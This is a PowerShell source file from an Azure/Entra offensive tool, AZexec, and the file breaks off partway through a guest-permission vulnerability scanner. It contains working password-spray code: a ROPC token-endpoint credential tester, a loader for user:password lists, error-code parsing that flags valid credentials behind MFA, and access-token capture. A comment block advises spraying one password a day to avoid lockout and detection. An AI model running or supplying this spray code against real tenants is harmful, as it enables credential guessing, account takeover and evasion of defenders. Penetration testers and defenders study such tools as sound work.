# AZexec - Guest Authentication and Vulnerability Functions
# These functions are loaded into the main script scope via dot-sourcing
function Test-GuestLoginEnabled {
    param(
        [string]$Domain
    )
    
    $result = [PSCustomObject]@{
        Domain = $Domain
        TenantExists = $false
        AcceptsExternalUsers = $false
        FederationType = "Unknown"
        AuthUrl = $null
        CloudInstanceName = $null
        NameSpaceType = $null
        DomainName = $null
        IsFederated = $false
        ThrottleStatus = $null
        Error = $null
    }
    
    try {
        # Method 1: Use GetCredentialType to check if external users are accepted
        # This checks what happens when we try to authenticate with an email from this domain
        $testEmail = "guesttest_$([guid]::NewGuid().ToString().Substring(0,8))@$Domain"
        
        $body = @{
            username = $testEmail
            isOtherIdpSupported = $true
            checkPhones = $false
            isRemoteNGCSupported = $true
            isCookieBannerShown = $false
            isFidoSupported = $true
            forceotclogin = $false
            otclogindisallowed = $false
            isExternalFederationDisallowed = $false
            isRemoteConnectSupported = $false
            federationFlags = 0
            isSignup = $false
            flowToken = ""
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        $result.TenantExists = $true
        $result.ThrottleStatus = $response.ThrottleStatus
        
        # Check if federation/external identity is supported
        if ($response.EstsProperties) {
            if ($response.EstsProperties.DomainType) {
                $result.NameSpaceType = $response.EstsProperties.DomainType
            }
        }
        
        # Check credentials type - this tells us about federation
        if ($response.Credentials) {
            if ($response.Credentials.FederationRedirectUrl) {
                $result.IsFederated = $true
                $result.AuthUrl = $response.Credentials.FederationRedirectUrl
            }
        }
        
        # Method 2: Check OpenID config for more details
        $openIdUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdUrl -Method Get -ErrorAction Stop
            
            if ($openIdConfig.issuer) {
                $result.TenantExists = $true
                
                if ($openIdConfig.tenant_region_scope) {
                    $result.CloudInstanceName = $openIdConfig.tenant_region_scope
                }
            }
        } catch {
            # OpenID might not be accessible for all tenants
        }
        
        # Method 3: Check realm discovery endpoint for B2B settings
        $realmUrl = "https://login.microsoftonline.com/common/userrealm/$testEmail`?api-version=2.0"
        try {
            $realmInfo = Invoke-RestMethod -Uri $realmUrl -Method Get -ErrorAction Stop
            
            if ($realmInfo) {
                $result.NameSpaceType = $realmInfo.NameSpaceType
                $result.DomainName = $realmInfo.DomainName
                $result.FederationType = $realmInfo.FederationBrandName
                $result.AuthUrl = $realmInfo.AuthUrl
                
                if ($realmInfo.NameSpaceType -eq "Managed") {
                    $result.IsFederated = $false
                    $result.AcceptsExternalUsers = $true  # Managed domains typically accept B2B
                } elseif ($realmInfo.NameSpaceType -eq "Federated") {
                    $result.IsFederated = $true
                    $result.AcceptsExternalUsers = $true  # Federated domains also support B2B
                } elseif ($realmInfo.NameSpaceType -eq "Unknown") {
                    # Unknown namespace might indicate external users are not accepted
                    $result.AcceptsExternalUsers = $false
                }
            }
        } catch {
            # Realm might not be accessible
        }
        
    } catch {
        $result.Error = $_.Exception.Message
        
        if ($_.Exception.Response.StatusCode -eq 400) {
            $result.TenantExists = $false
        }
    }
    
    return $result
}

# Test guest authentication with credentials (password spray style)
# ============================================
# PASSWORD SPRAY ATTACK - PHASE 2
# ============================================
# This function is Phase 2 of the password spray attack workflow
#
# FUNCTION: Test-GuestAuthentication
# PURPOSE: Validate username/password combinations using ROPC OAuth2 flow
# USAGE: Called by 'guest' command (.\azx.ps1 guest -UserFile users.txt -Password 'Pass123')
#
# HOW IT WORKS:
#   - Uses Resource Owner Password Credentials (ROPC) grant type
#   - Sends username/password directly to Azure Entra ID token endpoint
#   - Returns detailed authentication result including:
#     * Success/failure status
#     * MFA requirements (valid creds even if MFA blocks)
#     * Account lockout detection
#     * Password expiration detection
#     * Access token (if successful)
#
# DETECTION & OPSEC:
#   - Generates Azure Entra ID sign-in logs (failed authentication events)
#   - Multiple failed attempts may trigger account lockout
#   - Use delays between attempts (100ms default)
#   - Respect lockout thresholds (typically 5-10 failed attempts)
#   - For low-noise: spray 1 password per day across all users
#
# NETEXEC EQUIVALENT:
#   nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'
#   .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
#
# ERROR CODES:
#   - AADSTS50126: Invalid username or password
#   - AADSTS50053: Account locked (too many failed attempts)
#   - AADSTS50055: Password expired
#   - AADSTS50076/50079: MFA required (credentials ARE VALID!)
#   - AADSTS65001: Consent required (credentials ARE VALID!)
#   - AADSTS50034: User not found
#   - AADSTS7000218: ROPC flow disabled
#
# IMPORTANT: If MFA or Consent is required, credentials are VALID but additional
#           steps are needed. These results should be treated as successful
#           credential validation for password spray purposes.
#
# ============================================
function Test-GuestAuthentication {
    param(
        [string]$Username,
        [string]$Password,
        [string]$TenantId = "common"
    )
    
    $result = [PSCustomObject]@{
        Username = $Username
        Success = $false
        ErrorCode = $null
        ErrorDescription = $null
        TokenType = $null
        AccessToken = $null
        MFARequired = $false
        AccountLocked = $false
        PasswordExpired = $false
        ConsentRequired = $false
    }
    
    try {
        # Use Resource Owner Password Credential (ROPC) flow to test credentials
        # Using Azure PowerShell client ID (known public client)
        $clientId = "1950a258-227b-4e31-a9cf-717495945fc2"  # Azure PowerShell
        $scope = "https://graph.microsoft.com/.default openid profile offline_access"
        
        $body = @{
            grant_type = "password"
            client_id = $clientId
            scope = $scope
            username = $Username
            password = $Password
        }
        
        $tokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri $tokenUrl `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $body `
            -ErrorAction Stop
        
        $result.Success = $true
        $result.TokenType = $response.token_type
        $result.AccessToken = $response.access_token
        
    } catch {
        $errorResponse = $null
        
        try {
            if ($_.Exception.Response) {
                $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                $errorBody = $reader.ReadToEnd()
                $reader.Close()
                $errorResponse = $errorBody | ConvertFrom-Json
            }
        } catch {
            # Couldn't parse error response
        }
        
        if ($errorResponse) {
            $result.ErrorCode = $errorResponse.error
            $result.ErrorDescription = $errorResponse.error_description
            
            # Analyze error codes
            switch -Regex ($errorResponse.error_description) {
                "AADSTS50126" {
                    # Invalid username or password
                    $result.ErrorCode = "INVALID_CREDENTIALS"
                }
                "AADSTS50053" {
                    # Account locked
                    $result.AccountLocked = $true
                    $result.ErrorCode = "ACCOUNT_LOCKED"
                }
                "AADSTS50055" {
                    # Password expired
                    $result.PasswordExpired = $true
                    $result.ErrorCode = "PASSWORD_EXPIRED"
                }
                "AADSTS50076|AADSTS50079" {
                    # MFA required - credential is valid!
                    $result.MFARequired = $true
                    $result.Success = $true  # Credentials are valid, just need MFA
                    $result.ErrorCode = "MFA_REQUIRED"
                }
                "AADSTS65001" {
                    # Consent required
                    $result.ConsentRequired = $true
                    $result.Success = $true  # Credentials are valid
                    $result.ErrorCode = "CONSENT_REQUIRED"
                }
                "AADSTS50034" {
                    # User not found
                    $result.ErrorCode = "USER_NOT_FOUND"
                }
                "AADSTS50057" {
                    # Account disabled
                    $result.ErrorCode = "ACCOUNT_DISABLED"
                }
                "AADSTS50058" {
                    # Silent sign-in failed
                    $result.ErrorCode = "SILENT_SIGNIN_FAILED"
                }
                "AADSTS700016" {
                    # Application not found in tenant
                    $result.ErrorCode = "APP_NOT_FOUND"
                }
                "AADSTS7000218" {
                    # ROPC not allowed
                    $result.ErrorCode = "ROPC_DISABLED"
                }
                default {
                    $result.ErrorCode = $errorResponse.error
                }
            }
        } else {
            $result.ErrorDescription = $_.Exception.Message
        }
    }
    
    return $result
}


function Invoke-GuestEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$Password,
        [string]$UserFile,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Guest Login Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')" -Color "Yellow"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        # Method 1: Try to extract from username if provided
        if ($Username -and $Username -like "*@*") {
            $detectedDomain = ($Username -split "@")[1]
            Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
        }
        
        # Method 2: Try to get UPN from whoami command (Windows)
        if (-not $detectedDomain) {
            try {
                if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                    $upn = whoami /upn 2>$null
                    if ($upn -and $upn -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                    }
                }
            } catch {
                # Silent catch
            }
        }
        
        # Method 3: Try environment variable for USERDNSDOMAIN
        if (-not $detectedDomain) {
            $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
            if ($envDomain) {
                $detectedDomain = $envDomain
                Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
            }
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            Write-ColorOutput -Message "[!] Or provide a full email username: -Username user@example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: ROPC Authentication Testing`n" -Color "Yellow"
    
    # Phase 1: Check if tenant accepts external/guest authentication (unauthenticated)
    Write-ColorOutput -Message "[*] Phase 1: Checking tenant guest configuration (unauthenticated)..." -Color "Yellow"
    
    $guestConfig = Test-GuestLoginEnabled -Domain $Domain
    
    # Format output like nxc
    if ($guestConfig.TenantExists) {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists" -Color "Green"
        
        if ($guestConfig.NameSpaceType) {
            $nsColor = if ($guestConfig.NameSpaceType -eq "Managed") { "Cyan" } else { "Yellow" }
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] NameSpaceType: $($guestConfig.NameSpaceType)" -Color $nsColor
        }
        
        if ($guestConfig.IsFederated) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Enabled ($($guestConfig.FederationType))" -Color "Yellow"
            if ($guestConfig.AuthUrl) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Auth URL: $($guestConfig.AuthUrl)" -Color "DarkGray"
            }
        } else {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Managed (Cloud-only)" -Color "Cyan"
        }
        
        if ($guestConfig.AcceptsExternalUsers) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External/Guest users: Likely ENABLED (B2B)" -Color "Green"
        }
    } else {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found or not accessible" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message ""
    
    # Phase 2: Test authentication if credentials provided
    if ($Username -or $UserFile) {
        Write-ColorOutput -Message "[*] Phase 2: Testing guest authentication..." -Color "Yellow"
        
        $credentialsToTest = @()
        $results = @()
        
        # Single username/password test
        if ($Username) {
            if ($Username -notlike "*@*") {
                $Username = "$Username@$Domain"
            }
            $credentialsToTest += @{
                Username = $Username
                Password = if ($Password) { $Password } else { "" }
            }
        }
        
        # Load from file
        if ($UserFile) {
            if (-not (Test-Path $UserFile)) {
                Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            } else {
                try {
                    $fileContent = Get-Content $UserFile -ErrorAction Stop
                    foreach ($line in $fileContent) {
                        $line = $line.Trim()
                        if ($line -and $line -notlike "#*") {
                            # Format: username:password or just username
                            if ($line -like "*:*") {
                                $parts = $line -split ":", 2
                                $user = $parts[0].Trim()
                                $pass = $parts[1]
                            } else {
                                $user = $line
                                $pass = if ($Password) { $Password } else { "" }
                            }
                            
                            if ($user -notlike "*@*") {
                                $user = "$user@$Domain"
                            }
                            
                            $credentialsToTest += @{
                                Username = $user
                                Password = $pass
                            }
                        }
                    }
                    Write-ColorOutput -Message "[*] Loaded $($credentialsToTest.Count) credential(s) from file" -Color "Green"
                } catch {
                    Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
                }
            }
        }
        
        Write-ColorOutput -Message "[*] Testing $($credentialsToTest.Count) credential(s)...`n" -Color "Yellow"
        
        foreach ($cred in $credentialsToTest) {
            $authResult = Test-GuestAuthentication -Username $cred.Username -Password $cred.Password -TenantId $Domain
            
            $displayUser = $cred.Username
            if ($displayUser.Length -gt 35) {
                $displayUser = $displayUser.Substring(0, 32) + "..."
            }
            
            $passDisplay = if ($cred.Password -eq "") { "(empty)" } else { "(password)" }
            
            if ($authResult.Success) {
                if ($authResult.MFARequired) {
                    # Valid creds but MFA needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - MFA REQUIRED" -Color "Yellow"
                } elseif ($authResult.ConsentRequired) {
                    # Valid creds but consent needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - CONSENT REQUIRED" -Color "Yellow"
                } else {
                    # Full success - we got a token!
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] SUCCESS! Got access token $passDisplay" -Color "Green"
                }
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $true
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = ($null -ne $authResult.AccessToken)
                }
            } else {
                # Authentication failed
                $errorMsg = switch ($authResult.ErrorCode) {
                    "INVALID_CREDENTIALS" { "[-] Invalid credentials" }
                    "USER_NOT_FOUND" { "[-] User not found" }
                    "ACCOUNT_LOCKED" { "[!] ACCOUNT LOCKED" }
                    "ACCOUNT_DISABLED" { "[-] Account disabled" }
                    "PASSWORD_EXPIRED" { "[!] PASSWORD EXPIRED (valid user)" }
                    "ROPC_DISABLED" { "[!] ROPC disabled (try device code flow)" }
                    "APP_NOT_FOUND" { "[-] Application not found in tenant" }
                    default { "[-] Failed: $($authResult.ErrorCode)" }
                }
                
                $errorColor = if ($authResult.AccountLocked -or $authResult.PasswordExpired) { "Yellow" } else { "DarkGray" }
                
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + $errorMsg -Color $errorColor
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $false
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = $false
                }
            }
            
            # Small delay to avoid lockouts
            Start-Sleep -Milliseconds 100
        }
        
        # Summary
        $successCount = ($results | Where-Object { $_.Success }).Count
        $mfaCount = ($results | Where-Object { $_.MFARequired }).Count
        $lockedCount = ($results | Where-Object { $_.ErrorCode -eq "ACCOUNT_LOCKED" }).Count
        
        Write-ColorOutput -Message "`n[*] Authentication Test Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Total Tested:    $($results.Count)" -Color "Cyan"
        Write-ColorOutput -Message "    Valid Creds:     $successCount" -Color $(if ($successCount -gt 0) { "Green" } else { "DarkGray" })
        Write-ColorOutput -Message "    MFA Required:    $mfaCount" -Color $(if ($mfaCount -gt 0) { "Yellow" } else { "DarkGray" })
        Write-ColorOutput -Message "    Accounts Locked: $lockedCount" -Color $(if ($lockedCount -gt 0) { "Red" } else { "DarkGray" })
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                $exportData = [PSCustomObject]@{
                    Domain = $Domain
                    TenantConfig = $guestConfig
                    AuthResults = $results
                    Summary = @{
                        TotalTested = $results.Count
                        ValidCredentials = $successCount
                        MFARequired = $mfaCount
                        LockedAccounts = $lockedCount
                    }
                }
                
                if ($extension -eq ".csv") {
                    $results | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        # If we got valid credentials, offer to enumerate as guest
        $validCreds = $results | Where-Object { $_.Success -and -not $_.MFARequired -and $_.HasToken }
        if ($validCreds) {
            Write-ColorOutput -Message "`n[*] Valid credentials found! You can now enumerate as a guest user:" -Color "Green"
            Write-ColorOutput -Message "    .\azx.ps1 hosts   # Enumerate devices" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 groups  # Enumerate groups" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 pass-pol # Check password policies`n" -Color "Cyan"
        }
        
    } else {
        # No credentials provided - just show what's accessible without auth
        Write-ColorOutput -Message "[*] No credentials provided. Testing unauthenticated access..." -Color "Yellow"
        Write-ColorOutput -Message "[*] To test guest authentication, use:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user@domain.com -Password 'pass'" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user -Password ''  # Empty password test" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -UserFile users.txt -Password 'Summer2024!'" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] File format (one per line):" -Color "Yellow"
        Write-ColorOutput -Message "    username                 # Uses -Password for all" -Color "DarkGray"
        Write-ColorOutput -Message "    username:password        # Specific password per user" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com          # Full UPN" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com:password # Full UPN with password`n" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "[*] Guest enumeration complete!" -Color "Green"
}

# Helper function to test guest user permissions
function Test-GuestUserPermissions {
    param(
        [string]$TestType  # "Users", "Groups", "Devices", "Applications", "DirectoryRoles"
    )
    
    $result = [PSCustomObject]@{
        TestType = $TestType
        Accessible = $false
        ItemCount = 0
        Error = $null
        PermissionLevel = "None"
    }
    
    try {
        switch ($TestType) {
            "Users" {
                $users = Get-MgUser -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($users | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Groups" {
                $groups = Get-MgGroup -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($groups | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Devices" {
                $devices = Get-MgDevice -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($devices | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Applications" {
                $apps = Get-MgApplication -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($apps | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "DirectoryRoles" {
                $roles = Get-MgDirectoryRole -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($roles | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
        }
    } catch {
        $result.Error = $_.Exception.Message
        $result.Accessible = $false
    }
    
    return $result
}


function Get-GuestPermissionLevel {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        $guestRoleId = $authPolicy.GuestUserRoleId
        
        # Map GuestUserRoleId to permission level
        # a0b1b346-4d3e-4e8b-98f8-753987be4970 = Guest user access (most permissive - default before 2018)
        # 10dae51f-b6af-4016-8d66-8c2a99b929b3 = Guest users have limited access to properties and memberships of directory objects (default 2018-2021)
        # 2af84b1e-32c8-42b7-82bc-daa82404023b = Guest user access is restricted to properties and memberships of their own directory objects (most restrictive - recommended)
        
        $permissionLevel = switch ($guestRoleId) {
            "a0b1b346-4d3e-4e8b-98f8-753987be4970" { "Same as member users (CRITICAL)" }
            "10dae51f-b6af-4016-8d66-8c2a99b929b3" { "Limited (MEDIUM)" }
            "2af84b1e-32c8-42b7-82bc-daa82404023b" { "Restricted (GOOD)" }
            default { "Unknown ($guestRoleId)" }
        }
        
        return [PSCustomObject]@{
            GuestUserRoleId = $guestRoleId
            PermissionLevel = $permissionLevel
            IsVulnerable = ($guestRoleId -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970")
            IsRestricted = ($guestRoleId -eq "2af84b1e-32c8-42b7-82bc-daa82404023b")
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            GuestUserRoleId = $null
            PermissionLevel = "Unknown"
            IsVulnerable = $false
            IsRestricted = $false
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

# Helper function to check external collaboration settings
function Get-ExternalCollaborationSettings {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        
        # Check if external users can be invited
        $allowInvites = $authPolicy.AllowInvitesFrom
        $allowedToInvite = $authPolicy.AllowedToSignUpEmailBasedSubscriptions
        
        return [PSCustomObject]@{
            AllowInvitesFrom = $allowInvites
            AllowEmailSubscriptions = $allowedToInvite
            BlockMsolPowerShell = $authPolicy.BlockMsolPowerShell
            DefaultUserRolePermissions = $authPolicy.DefaultUserRolePermissions
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            AllowInvitesFrom = "Unknown"
            AllowEmailSubscriptions = $null
            BlockMsolPowerShell = $null
            DefaultUserRolePermissions = $null
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

function Invoke-GuestVulnScanEnumeration {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Guest User Vulnerability Scanner" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest-Vuln-Scan (Azure Null Session Security Assessment)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --check-null-session + security audit`n" -Color "Yellow"
    
    $scanResults = [PSCustomObject]@{
        Domain = $Domain
        ScanDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase1_Unauthenticated = @{}
        Phase2_Authenticated = @{}
        Vulnerabilities = @()
        RiskScore = 0
        Summary = @{}
    }
    
    # ============================================
    # PHASE 1: UNAUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 1: Unauthenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            # Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Try environment variable
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Try Graph context
            if (-not $detectedDomain) {
                try {
                    $context = Get-MgContext -ErrorAction SilentlyContinue
                    if ($context -and $context.Account -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from Graph context: $detectedDomain" -Color "Green"
                    }
                } catch {
                    # Silent
                }
            }
        } catch {
            # Silent catch
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Yellow"
            Write-ColorOutput -Message "[*] Skipping domain-specific unauthenticated checks" -Color "Yellow"
            Write-ColorOutput -Message "[*] Use -Domain parameter for full enumeration`n" -Color "DarkGray"
        }
    }
    
    $scanResults.Domain = $Domain
    
    # 1.1 Check if external collaboration is enabled (unauthenticated)
    if ($Domain) {
        Write-ColorOutput -Message "[*] Testing external collaboration configuration..." -Color "Yellow"
        
        $guestConfig = Test-GuestLoginEnabled -Domain $Domain
        $scanResults.Phase1_Unauthenticated.GuestConfiguration = $guestConfig
        
        if ($guestConfig.TenantExists) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists" -Color "Green"
            
            if ($guestConfig.AcceptsExternalUsers) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[!] External collaboration: ENABLED" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "ExternalCollaboration"
                    Risk = "MEDIUM"
                    Description = "Tenant accepts external/guest users (B2B collaboration enabled)"
                    Recommendation = "Review guest user access policies and implement conditional access"
                }
                $scanResults.RiskScore += 30
            } else {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External collaboration: Appears restricted" -Color "Green"
            }
            
            if ($guestConfig.IsFederated) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: $($guestConfig.FederationType)" -Color "Cyan"
            }
        } else {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found" -Color "Red"
            return
        }
        
        Write-ColorOutput -Message ""
    }
    
    # ============================================
    # PHASE 2: AUTHENTICATED CHECKS (GUEST PERMISSIONS)
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 2: Authenticated Enumeration (Guest Permission Testing)" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Check if we can connect to Graph
    $graphConnected = $false
    $isGuest = $false
    $currentUser = $null
    
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Using existing Graph connection: $currentUser" -Color "Green"
        }
    } catch {
        # Not connected yet
    }
    
    if (-not $graphConnected) {
        Write-ColorOutput -Message "[*] Attempting to connect to Microsoft Graph..." -Color "Yellow"
        try {
            # Request scopes needed for guest permission testing
            Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Device.Read.All","Application.Read.All","Directory.Read.All","Policy.Read.All" -ErrorAction Stop
            $context = Get-MgContext
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Connected as: $currentUser" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Authenticated checks will be skipped" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    if ($graphConnected) {
        # Check if current user is a guest
        $isGuest = Test-IsGuestUser -UserPrincipalName $currentUser
        
        if ($isGuest) {
            Write-ColorOutput -Message "[!] GUEST USER DETECTED - Testing guest permission boundaries" -Color "Yellow"
            Write-ColorOutput -Message "[*] This simulates the 'Azure Null Session' attack scenario`n" -Color "Yellow"
        } else {
            Write-ColorOutput -Message "[*] MEMBER USER - Testing what guests could access" -Color "Cyan"
            Write-ColorOutput -Message "[*] Results show potential guest enumeration capabilities`n" -Color "Cyan"
        }
        
        $scanResults.Phase2_Authenticated.IsGuest = $isGuest
        $scanResults.Phase2_Authenticated.CurrentUser = $currentUser
        
        # 2.1 Get guest permission policy
        Write-ColorOutput -Message "[*] Checking guest permission policy..." -Color "Yellow"
        
        $guestPermPolicy = Get-GuestPermissionLevel
        $scanResults.Phase2_Authenticated.GuestPermissionPolicy = $guestPermPolicy
        
        if ($guestPermPolicy.Success) {
            $policyColor = if ($guestPermPolicy.IsVulnerable) { "Red" } elseif ($guestPermPolicy.IsRestricted) { "Green" } else { "Yellow" }
            Write-ColorOutput -Message "    [*] Guest Permission Level: $($guestPermPolicy.PermissionLevel)" -Color $policyColor
            
            if ($guestPermPolicy.IsVulnerable) {
                Write-ColorOutput -Message "    [!] CRITICAL: Guests have SAME permissions as members!" -Color "Red"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "CRITICAL"
                    Description = "Guest users have same permissions as member users (GuestUserRoleId: a0b1b346-4d3e-4e8b-98f8-753987be4970)"
                    Recommendation = "Change to restricted mode: Set-MgPolicyAuthorizationPolicy -GuestUserRoleId '2af84b1e-32c8-42b7-82bc-daa82404023b'"
                }
                $scanResults.RiskScore += 50
            } elseif (-not $guestPermPolicy.IsRestricted) {
